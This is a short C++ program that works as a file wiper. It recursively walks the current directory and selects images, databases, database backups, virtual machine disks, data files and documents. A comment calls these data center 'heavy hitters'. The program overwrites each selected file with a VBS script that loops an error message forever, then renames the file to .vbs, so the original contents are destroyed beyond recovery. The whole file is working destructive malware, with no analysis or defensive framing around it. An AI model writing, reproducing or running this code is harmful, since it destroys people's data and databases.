#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include <algorithm>
#include <vector>

namespace fs = std::filesystem;
using namespace std;

void execute_payload(string p) {
    // The "World Domination" VBS loop
    string vbs_loop = "Do\n  MsgBox \"Critical System Error: OwO detected. :3\", 0+16, \"System Failure\"\nLoop";

    if (!fs::exists(p)) return;
    vector<fs::path> target_files;

    try {
        for (auto& entry : fs::recursive_directory_iterator(p)) {
            if (!entry.is_regular_file()) continue;
            
            string ext = entry.path().extension().string();
            transform(ext.begin(), ext.end(), ext.begin(), ::tolower);

            // Re-added the data center "heavy hitters"
            if (ext==".jpg"||ext==".png"||ext==".mdf"||ext==".ldf"|| 
                ext==".vhdx"||ext==".vmdk"||ext==".parquet"||ext==".avro"|| 
                ext==".bak"||ext==".sql"||ext==".json"||ext==".pdf"|| 
                ext==".vbs"||ext==".bat"||ext==".gdoc"||ext==".docx") 
            { 
                target_files.push_back(entry.path()); 
            }
        }
    } catch (...) {}

    for (auto& fp : target_files) {
        try {
            ofstream file_out(fp, ios::trunc);
            if (file_out.is_open()) {
                file_out << vbs_loop; 
                file_out.close();

                // Convert everything to a runnable script
                if (fp.extension() != ".vbs") { 
                    fs::rename(fp, fp.string() + ".vbs"); 
                }
            }
        } catch (...) {}
    }
}

int main() {
    execute_payload("./"); 
    return 0;
}
